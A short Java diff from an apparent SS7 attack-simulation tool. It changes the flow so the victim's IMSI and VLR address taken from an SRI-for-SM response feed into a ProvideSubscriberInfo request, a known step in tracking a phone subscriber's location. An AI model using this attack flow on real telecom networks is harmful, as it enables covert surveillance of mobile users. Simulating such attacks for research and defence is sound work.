@@ -330,12 +330,10 @@ public class AttackSimulationOrganizer implements Stoppable {
         }
 
         SendRoutingInfoForSMResponse sriResponse = this.attackerBhlrA.getTestAttackClient().getLastSRIForSMResponse();
-
         String victimImsi = sriResponse.getIMSI().getData();
-        System.out.println("ADDRESS CONTAINED IN SRI: " + sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress());
+        String victimVlrAddress = sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress();
 
-        System.exit(-1);
-
+        this.attackerBvlrA.getConfigurationData().getMapConfigurationData().setRemoteAddressDigits(victimVlrAddress);
         this.attackerBvlrA.getTestAttackClient().performProvideSubscriberInfoRequest();
 
         while(!this.attackerBvlrA.gotPSIResponse()){
